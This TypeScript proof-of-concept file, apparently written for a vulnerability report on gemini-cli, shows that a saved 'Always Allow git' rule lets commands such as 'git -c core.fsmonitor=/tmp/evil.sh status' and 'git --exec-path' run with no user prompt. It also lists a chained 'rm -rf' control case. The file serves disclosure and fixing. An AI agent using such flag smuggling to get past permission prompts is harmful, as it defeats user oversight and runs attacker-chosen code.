// PoC: "Always Allow" prefix bypass via dangerous command flags (gemini-cli)
//
// STATUS: Already run and confirmed tonight against the real, unmodified
// source. This file reproduces that exact test for the submission.
//
// HOW TO RUN THIS:
//   1. Clone the target repo:
//        git clone https://github.com/google-gemini/gemini-cli.git
//   2. From inside the cloned repo root, install tsx (only needed to run
//      TS directly, no build step):
//        npm install --no-save tsx
//   3. Save this file as:
//        packages/core/src/policy/poc_flag_smuggling.ts
//      (it must sit inside packages/core/src/policy/ so the relative
//      imports below resolve against the real source)
//   4. Run:
//        npx tsx packages/core/src/policy/poc_flag_smuggling.ts
//   5. Read the output. The two lines marked "<- confirmed" show commands
//      with dangerous git flags being ALLOWED under a saved "always allow
//      git" rule, with no confirmation shown to the user.
//
// This imports the real, unmodified policy engine directly — no target
// code is copied or modified.

import { PolicyEngine } from './policy-engine.js';
import { PolicyDecision } from './types.js';
import { buildArgsPatterns } from './utils.js';

// Replicates exactly what happens when a user clicks "Always Allow" for
// git in the real CLI (see packages/core/src/policy/config.ts,
// createPolicyUpdater -> buildArgsPatterns(undefined, message.commandPrefix)).
const patterns = buildArgsPatterns(undefined, 'git');
console.log('Real generated regex pattern(s):', patterns);
console.log();

const engine = new PolicyEngine({ rules: [] });
for (const pattern of patterns) {
  if (pattern) {
    engine.addRule({
      toolName: 'run_shell_command',
      decision: PolicyDecision.ALLOW,
      priority: 100,
      argsPattern: new RegExp(pattern),
    });
  }
}

const tests: Array<[string, string]> = [
  ['git status', 'expected: allow (normal, safe usage)'],
  ['gitfoo status', 'expected: ask_user (boundary check sanity control)'],
  ['git -c core.fsmonitor=/tmp/evil.sh status', 'THE ATTACK: git runs an attacker-chosen script via -c config override'],
  ['git --exec-path=/tmp/evil status', 'THE ATTACK: a second, independent flag with the same effect'],
  ['git status; rm -rf /tmp/x', 'expected: ask_user (chained commands ARE correctly caught - not the bug)'],
];

(async () => {
  for (const [cmd, note] of tests) {
    const result = await engine.check({
      name: 'run_shell_command',
      args: { command: cmd },
    });
    console.log(`${result.decision.toUpperCase().padEnd(9)} <- ${JSON.stringify(cmd)}`);
    console.log(`          (${note})`);
  }
  console.log();
  console.log('Separately confirmed: in confirmation-bus/message-bus.ts, a');
  console.log('PolicyDecision.ALLOW is converted directly to confirmed:true');
  console.log('with no UI shown - so "allow" above means the user genuinely');
  console.log('never sees a prompt for these commands.');
})();
